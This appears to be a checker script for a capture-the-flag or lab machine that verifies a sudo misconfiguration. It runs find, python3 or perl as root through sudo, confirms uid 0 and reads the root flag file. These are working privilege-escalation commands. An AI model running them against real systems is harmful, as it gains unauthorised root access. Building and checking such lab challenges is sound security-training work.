#!/bin/sh
# Prove the sudo entry is real: as $BOX_U, run the allowed binary as root and
# read the root flag.
set -eu
bin="${BOX_BINARY:?BOX_BINARY is not set}"

case "$bin" in
    */find)
        uid=$(sudo -n "$bin" /root/root.txt -exec id -u \; 2>/dev/null | tr -d '[:space:]')
        flag=$(sudo -n "$bin" /root/root.txt -exec cat {} \; 2>/dev/null || true)
        ;;
    */python3)
        uid=$(sudo -n "$bin" -c 'import os; print(os.getuid())' 2>/dev/null | tr -d '[:space:]')
        flag=$(sudo -n "$bin" -c 'print(open("/root/root.txt").read())' 2>/dev/null || true)
        ;;
    */perl)
        uid=$(sudo -n "$bin" -e 'print $<, "\n"' 2>/dev/null | tr -d '[:space:]')
        flag=$(sudo -n "$bin" -e 'open my $f, "<", "/root/root.txt"; print <$f>' 2>/dev/null || true)
        ;;
    *)
        echo "no verified escape for $bin" >&2
        exit 2
        ;;
esac

[ "$uid" = "0" ] || { echo "did not get root (uid=$uid)" >&2; exit 1; }
echo "$flag" | grep -q 'FLAG{root-' || { echo "root.txt not readable" >&2; exit 1; }
echo "root achieved via sudo $bin"
